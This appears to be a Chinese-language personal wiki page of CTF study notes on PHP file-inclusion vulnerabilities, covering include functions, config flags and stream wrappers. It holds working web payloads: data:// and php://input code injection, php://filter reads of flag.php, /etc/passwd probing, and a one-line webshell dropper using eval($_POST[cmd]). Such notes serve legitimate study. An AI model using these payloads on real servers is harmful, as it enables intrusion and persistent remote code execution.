@@ -1,0 +1,113 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.6
+Creation-Date: 2024-11-26T11:32:15+08:00
+
+====== 文件包含 ======
+Created 星期二 26 十一月 2024
+
+https://hello-ctf.com/HC_Web/include/
+
+php默认参数
+allow_url_fopen=On  （本地文件包含，默认开启）
+allow_url_include=Off  （远程文件包含，默认关闭）
+
+运行期间修改配置
+ini_set('allow_url_include', true);  // 本地测试未通过
+print_r(ini_get('allow_url_include'));
+
+相关指令：
+include()  /  include 'xx'
+include_once()  / include_once 'xx'
+require()  /  require 'xx'
+require_once()  /  require_once 'xx'
+file_get_contents()
+highlight_file()
+fopen()
+readfile()
+fread()
+fgetss()
+fgets()
+parse_ini_file()
+show_source()
+file()
+var_dump(scandir('/')); 
+
+如果文件符合php语法（不管扩展名），都会被php解析
+如果不符合php语法，则显示其内容
+
+寻找文件方式：https://www.php.net/manual/zh/wrappers.php
+1. file协议 https://www.php.net/manual/zh/wrappers.file.php
+* 不需要allow_url_fopen、不需要allow_url_include （只能本地文件包含）
+include(相对路径或绝对路径)
+include('''file://绝对路径''')  // 以 ''file://'' 开头则必须为绝对路径
+
+2. data协议
+https://datatracker.ietf.org/doc/html/rfc2397
+* **需要**allow_url_fopen、**需要**allow_url_include
+格式：
+''data://[<mediatype>][;base64],<data>''
+示例：
+include('''data://text/plain,<?php phpinfo();''')
+include('''data://text/plain;base64,[base64编码]''')
+
+3. php协议 https://www.php.net/manual/zh/wrappers.php.php
+* 不需要allow_url_fopen
+* 仅input, stdin, memory, temp 需要开启远程文件包含 allow_url_include
+
+3.1 ''php://filter'' （只能本地文件包含）
+* 不需要allow_url_fopen、不需要allow_url_include
+resource=要过滤的数据流，必须
+read=读过滤器，多个过滤器用|隔开
+write=写过滤器，多个过滤器用|隔开
+不指定read或write的话会视情况，两个都用
+
+过滤器列表：https://www.php.net/manual/zh/filters.php
+常用转换过滤器：https://www.php.net/manual/zh/filters.convert.php
+convert.base64-encode ; convert.base64-decode
+convert.quoted-printable-encode ; convert.quoted-printable-decode
+常用字符串过滤器：https://www.php.net/manual/zh/filters.string.php
+string.rot13
+举例：
+* readfile("''php://filter/resource=flag.php''")  # 得到明文。php文件会当作php代码解析
+* include "''php://filter/read=convert.base64-encode/resource=flag.php''"  # 得到base64编码（常用）
+* file_put_contents("''php://filter/write=string.rot13/resource=example.txt''","Hello World");  # 把 Hello World 写入example.txt
+* ''php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=1.php''  # 其他编码
+* ''php://filter/string.rot13/resource=1.php''  # rot13
+
+可以用base64或其他编码写入文件，再用filter解码出来，实现php注入
+
+3.2 ''php://input''
+* 不需要allow_url_fopen、**需要**allow_url_include
+把post的body作为输入。当enctype="multipart/form-data"，且 enable_post_data_reading 开启（默认开启）时，''php://input''不可用。
+示例：
+include '''php://input''';
+POST输入：
+<?php phpinfo();?>
+注意：hackbar有bug，如果没有key=部分则post为空，可以输入a=<?php phpinfo();?>，或使用其他工具
+注意2：hackbar的enctype要选择带 **(raw)** 的，避免输入被url编码，导致变成字符串"%3C%3Fphp+phpinfo%28%29%3B%3F%3E"
+
+注入webshell：
+<?php fwrite(fopen("shell.php","w"),'<?php eval($_POST[cmd]);?>'); ?>
+
+3.3 其他
+''php://output''
+''php://fd''
+''php://memory''
+''php://temp''
+''php://stdin 、 php://stdout 、 php://stderr''
+
+4. http协议、ftp协议
+
+
+其他协议见文档
+
+判断服务器linux还是windows：
+1. 尝试读取 /etc/passwd 如果可行则代表操作系统为 Linux，反之为 Windows（注意判断不是百分百正确，不排除可控点存在过滤不允许任意文件包含）
+2. 包含文件时利用大小写敏感的特性，如果包含的文件大小写不敏感则是windows，否则是linux
+
+其他函数
+stream_resolve_include_path(filename): string  获取文件绝对路径
+getcwd(): string
+''__DIR__'' : string
+get_include_path(): string|false
+set_include_path(path): string|false
